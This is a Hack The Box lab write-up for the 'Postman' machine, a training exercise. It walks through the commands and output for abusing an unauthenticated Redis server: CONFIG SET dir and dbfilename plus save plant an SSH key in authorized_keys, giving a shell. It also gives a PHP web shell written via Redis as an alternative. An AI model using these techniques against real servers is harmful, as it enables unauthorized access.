# LAB — Code Execution with Redis (HTB Postman)

> **Platform:** Hack The Box
> **Box:** Postman
> **Difficulty:** Easy
> **OS:** Linux
> **Technique:** Unauthenticated Redis → SSH key injection → shell as `redis` user

Postman features a Redis server running without authentication. By abusing Redis `CONFIG SET` commands, we can write an SSH public key to the `redis` user's `authorized_keys` file and gain shell access.

## 5. Discover Redis Working Directory

```
10.129.42.218:6379> config get dir
1) "dir"
2) "/var/lib/redis"
```

The Redis process runs as user `redis` with home directory `/var/lib/redis`.

> **Why `/var/lib/redis` and not `/home/redis`?** On Ubuntu/Debian, system service users typically get home directories under `/var/lib/`, not `/home/`.

---

## 6. SSH Key Injection — The Attack

### 6a. Change Redis Working Directory to `.ssh`

```
10.129.42.218:6379> config set dir /var/lib/redis/.ssh
OK
```

Verify:

```
10.129.42.218:6379> config get dir
1) "dir"
2) "/var/lib/redis/.ssh"
```

> ⚠️ **Important:** The `.ssh` directory must **already exist** on the target. `CONFIG SET dir` can only point to an existing directory — it cannot create new ones.

### 6b. Generate SSH Keypair on Attacker Machine

```
┌──(kali㉿kali)-[~]
└─$ ssh-keygen -t ed25519

The key's randomart image is:
```

Read the public key:

```
┌──(kali㉿kali)-[~]
└─$ cat ~/.ssh/id_ed25519.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG9Ed1uaNsIdhz2a6oJC9Cn0+q7rmh+mAFA+y/NXOxri kali@kali
```

### 6c. Format the Public Key for Redis

Redis dumps its entire database to a file. The `authorized_keys` file needs clean newlines around the key data so SSH can parse it correctly even with Redis metadata surrounding it:

```bash
( echo -e "\n\n"; cat ~/.ssh/id_ed25519.pub; echo -e "\n\n") > id_rsa.pub
```

Verify the formatted output:

```
└─$ cat id_rsa.pub           



ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG9Ed1uaNsIdhz2a6oJC9Cn0+q7rmh+mAFA+y/NXOxri kali@kali



   
```

> The `\n\n` padding before and after ensures the SSH key appears on its own clean lines when Redis writes surrounding binary/metadata into the file.

### 6d. Pipe the Key into Redis

```
└─$ cat id_rsa.pub | redis-cli -h 10.129.42.218 -x set newkey
OK
```

> The `-x` flag tells `redis-cli` to read the value from **stdin** instead of the command line.

### 6e. Verify the Key Was Stored

```
10.129.42.218:6379> keys *
1) "newkey"
```

```
10.129.42.218:6379> get "newkey"
"\n\n\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG9Ed1uaNsIdhz2a6oJC9Cn0+q7rmh+mAFA+y/NXOxri kali@kali\n\n\n\n"
```

The public key is stored in Redis memory with proper newline padding. ✅

### 6f. Write to Disk as `authorized_keys`

The key exists only in RAM right now. We need to flush it to disk as the `authorized_keys` file:

```
10.129.42.218:6379> config set dbfilename "authorized_keys"
OK
```

> `dbfilename` controls the filename Redis uses when persisting its database to disk. Combined with the `dir` we set earlier (`/var/lib/redis/.ssh`), this creates `/var/lib/redis/.ssh/authorized_keys`.

Now save (flush memory → disk):

```
10.129.42.218:6379> save
OK
```

```bash

```


## Attack Chain Summary

```
Nmap scan → Port 6379 open (Redis, no auth)
    ↓
redis-cli → Connected unauthenticated
    ↓
info → No keys/data to extract, but CONFIG commands allowed
    ↓
config get dir → /var/lib/redis (redis user's home)
    ↓
config set dir /var/lib/redis/.ssh → Point to .ssh folder
    ↓
Generate SSH keypair on Kali → Format public key with \n\n padding
    ↓
cat key | redis-cli -x set newkey → Store public key in Redis memory
    ↓
config set dbfilename "authorized_keys" → Set dump filename
    ↓
save → Flush memory to /var/lib/redis/.ssh/authorized_keys
    ↓
ssh redis@target -i ~/.ssh/id_ed25519 → Shell as redis user ✅
```

## Two Vulnerabilities Exploited

| Vulnerability | Impact |
|---------------|--------|
| **No Authentication** | Anyone can connect to Redis and run commands |
| **No Write Protection** | `CONFIG SET` allows changing the working directory and dump filename, enabling arbitrary file writes |

---

## Alternative Attack — Web Shell via Redis

If the web root (e.g., `/var/www/html`) is writable by the Redis user, you can write a PHP web shell instead of an SSH key:

```
config set dir /var/www/html
set shell "<?php system($_GET['cmd']); ?>"
config set dbfilename shell.php
save
```

Then access: `http://<target>/shell.php?cmd=whoami`

> This is useful when SSH is not open or the `.ssh` directory doesn't exist.

---

## Lessons Learned

- **Empty keyspace ≠ safe Redis.** Even with zero keys, unauthenticated `CONFIG` access allows arbitrary file writes.
- **SSH key injection via Redis** requires: (1) no auth, (2) `CONFIG` not disabled, (3) `.ssh` directory already exists for the Redis user.
- **Newline padding** (`\n\n`) around the SSH key is essential — without it, the Redis metadata in the dump file corrupts the key format.
- **`redis-cli -x`** reads values from stdin — critical for piping file contents into a key.
- The `dbfilename` + `dir` + `save` combo is the core write primitive in Redis exploitation.
